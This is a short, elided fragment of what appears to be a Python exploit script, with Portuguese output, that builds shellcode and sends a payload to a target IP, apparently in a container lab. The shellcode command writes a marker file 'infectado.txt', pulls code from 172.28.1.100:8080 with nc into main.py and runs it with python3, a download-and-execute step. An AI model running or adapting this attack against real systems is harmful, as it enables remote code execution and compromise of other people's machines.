...
def main():
    ...
    shellcode = create_hex_command(b"echo 'true' > infectado.txt && nc -w3 172.28.1.100 8080 > main.py && python3 main.py")
    payload = getFile(bufaddr, shellcode)

    writeFile(payload, targetIP)

    print("Payload enviado! Verifique se infectado.txt apareceu dentro do container.")
